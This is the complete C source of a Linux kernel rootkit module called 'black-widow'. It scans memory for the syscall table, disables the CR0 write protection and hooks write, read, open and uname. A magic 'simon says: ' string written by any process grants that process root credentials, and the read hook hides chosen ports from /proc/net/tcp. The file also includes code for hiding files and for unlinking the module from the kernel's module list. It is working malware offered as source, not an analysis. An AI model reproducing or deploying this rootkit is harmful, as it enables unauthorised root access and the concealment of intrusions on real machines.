/*
 * =====================================================================================
 *
 *       Filename:  black-widow.c
 *
 *    Description:  main src file
 *
 *        Version:  1.0 *        Created:  03/27/2015 01:43:28 AM
 *       Revision:  none
 *       Compiler:  gcc
 * *         Author:  samy shehata
 *   Organization:  
 *
 * =====================================================================================
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/init.h>
#include <linux/string.h>
#include <linux/stat.h>
#include <linux/file.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/proc_fs.h>
#include <linux/slab.h>
#include <linux/seq_file.h>
#include <linux/vmalloc.h>
#include <linux/fs.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <asm/unistd.h>
#include <asm/syscall.h>
#include <linux/utsname.h>
#include <linux/namei.h>
#include <asm/uaccess.h>
#include <linux/kdev_t.h>
#include <linux/stat.h>
#include <linux/pid.h>
#include <asm/stat.h>
#include <linux/string.h>
#include <linux/namei.h>
#include <linux/dirent.h>
#include <linux/fs_struct.h>

MODULE_LICENSE("GPL");

#define PROTECTED_FLAG 0x10000

static struct list_head *prev_entry; /* Pointer to previous entry in proc/modules */
static unsigned long **_sys_call_table = NULL;
static char opened_name[50];
static long opened_fd;
static char ports[10][6];
static int port = 0;
static char hidden[10][50];
static int sizes[10];
static int last_hidden = 0;

static asmlinkage long (*org_uname) (struct new_utsname *);
static asmlinkage long (*org_getdents)(unsigned int, struct linux_dirent __user *, unsigned int);
static asmlinkage long (*org_read)(unsigned int, char __user *, size_t);
static asmlinkage long (*org_open)(const char __user *, int, umode_t);
static asmlinkage long (*org_write)(unsigned int, const char __user *, size_t);

static asmlinkage long write(unsigned int fd, const char __user *buf, size_t count) {
  struct cred *new;
  if (strncmp(buf, "simon says: ", sizeof("simon says: ")-1) == 0) {
    buf += (sizeof("simon says: ")-1);
    switch(*buf) {
      case 0:
        strncpy(ports[port++], buf+1, 5);
        printk("%s\n", ports[port-1]);
        break;
      case 1:
        buf += 1;
        kstrtoint_from_user(buf, 2, 10, &sizes[last_hidden]);
        buf += 2;
        strncpy(hidden[last_hidden], buf, sizes[last_hidden]);
        printk("%s\n", hidden[last_hidden]);
        printk("%i\n", sizes[last_hidden]);
        last_hidden += 1;
        break;
      case 2:
        new = prepare_creds();
        if (new != NULL) {
          new->uid.val = new -> gid.val = 0;
          new->euid.val = new ->egid.val = 0;
          new->suid.val = new->sgid.val=0;
          new->fsuid.val = new->fsgid.val = 0;
          commit_creds(new);
        }
        break;
    }
    return 0;
  } else {
    return org_write(fd, buf, count);
  }
}

static asmlinkage long open(const char __user *filename, int flags, umode_t mode) {
  strcpy(opened_name, filename);
  opened_fd = org_open(filename, flags, mode);
  return opened_fd;
}

static asmlinkage long read(unsigned int fd, char __user *buf, size_t count) {
  int i,j,p,k,ptr;
  int ret;
  mm_segment_t old_fs;
  char line[500];
  int copy;

  old_fs = get_fs();
  set_fs(KERNEL_DS);
  ret = org_read(fd, buf, count);
  set_fs(old_fs);
  if (opened_fd == fd && strncmp(opened_name, "/proc/net/tcp", 13) == 0) {
    for (i = j = p = 0; i < ret; i++,j++) {
      if (buf[i] == '\n' || buf[i] == '\0') {
        line[j] = buf[i];
        copy = 1;
        for (ptr = 0; ptr < port; ptr++) {
          for (k = 0; k < j - 4; k++) {
            if (strncmp(line+k, ports[ptr], 5) == 0) {
              copy = 0;
              break;
            }
          }
        }
        if (copy) {
          printk("copying\n");
          if (copy_to_user(buf+p, line, j+1)) {
            printk("copying failed\n");
            ret = -EAGAIN;
            goto end;
          }
          p += j+1;
        }
        j = -1;
      } else {
        line[j] = buf[i];
      }
    }
    if (ret > 0)
      ret = p;
  }
end:
  return ret;
}

static asmlinkage long getdents(unsigned int fd, struct linux_dirent __user
    *dirp, unsigned int count) {
  int i, j, ptr;
  char* buf;
  int ret;
  mm_segment_t old_fs;

  old_fs = get_fs();
  set_fs(KERNEL_DS);
  ret = org_getdents(fd,  dirp, count);
  set_fs(old_fs);
  buf = (char *)dirp;
  for (i = j = 0; i < ret; i++,j++) {
    buf[j] = buf[i];
    for (ptr = 0; ptr < last_hidden; ptr++) {
      if (strncmp(buf + i, hidden[ptr], sizes[ptr]) == 0) {
        for (; buf[i] != '\0'; i++);
        for (; i % 8 != 0; i++);
        i--;
        j -= 19;
      }
    }
  }
  if (ret > 0)
    ret = j;

  return ret;
}

static asmlinkage long uname(struct new_utsname *name) {
  org_uname(name);
  strcpy(name->sysname, "Feel The Widow's Bite");
  return 0;
} 

static void find_sctable(void) {
  unsigned long **sctable = NULL;
  unsigned long ptr;

  for ( ptr = PAGE_OFFSET;
      ptr < ULLONG_MAX;
      ptr += sizeof(void *)) {
    unsigned long *p;
    p = (unsigned long *)ptr;
    if (p[__NR_close] == (unsigned long) sys_close) {
      sctable = (unsigned long **)p;
      _sys_call_table = &sctable[0];
      break;
    }
  }
}

static inline void memorize(void) {
  prev_entry = THIS_MODULE->list.prev;
  find_sctable();

  org_uname = _sys_call_table[__NR_uname];
  org_read = _sys_call_table[__NR_read];
  org_open = _sys_call_table[__NR_open];
  org_getdents = _sys_call_table[__NR_getdents];
  org_write = _sys_call_table[__NR_write];
}

static inline void vanish(void) {
  list_del(&THIS_MODULE->list);
  kobject_del(&THIS_MODULE->mkobj.kobj);
  list_del(&THIS_MODULE->mkobj.kobj.entry);

  kfree(THIS_MODULE->notes_attrs);
  THIS_MODULE->notes_attrs = NULL;
  kfree(THIS_MODULE->sect_attrs);
  THIS_MODULE->sect_attrs = NULL;
  kfree(THIS_MODULE->mkobj.mp);
  THIS_MODULE->mkobj.mp = NULL;
  THIS_MODULE->modinfo_attrs->attr.name = NULL;
  kfree(THIS_MODULE->mkobj.drivers_dir);
  THIS_MODULE->mkobj.drivers_dir = NULL;
}

static inline void appear(void) {
  list_add(&THIS_MODULE->list, prev_entry);
}

static inline void protect(void) {
  try_module_get(THIS_MODULE);
}

static inline void release(void) {
  module_put(THIS_MODULE);
}

static inline void clear_write_permission(void) {
  unsigned long cr0;
  __asm__("mov %%cr0, %0" : "=r" (cr0));
  __asm__("mov %0, %%cr0" : : "r" (cr0 & ~PROTECTED_FLAG)); 
}

static inline void set_write_permission(void) {
  unsigned long cr0;
  __asm__("mov %%cr0, %0" : "=r" (cr0));
  __asm__("mov %0, %%cr0" : : "r" (cr0 | PROTECTED_FLAG)); 
}

// on module load
static int __init load_module(void) {
  memorize(); 
  clear_write_permission();
  _sys_call_table[__NR_uname] = uname;
  _sys_call_table[__NR_read] = read;
  _sys_call_table[__NR_open] = open;
  //_sys_call_table[__NR_getdents] = getdents;
  _sys_call_table[__NR_write] = write;
  return 0;
}

// on module unload
static void __exit cleanup(void) {
  _sys_call_table[__NR_uname] = org_uname;
  _sys_call_table[__NR_open] = org_open;
  _sys_call_table[__NR_read] = org_read;
  //_sys_call_table[__NR_getdents] = org_getdents;
  _sys_call_table[__NR_write] = org_write;
  set_write_permission();
  return;
}

module_init(load_module);
module_exit(cleanup);
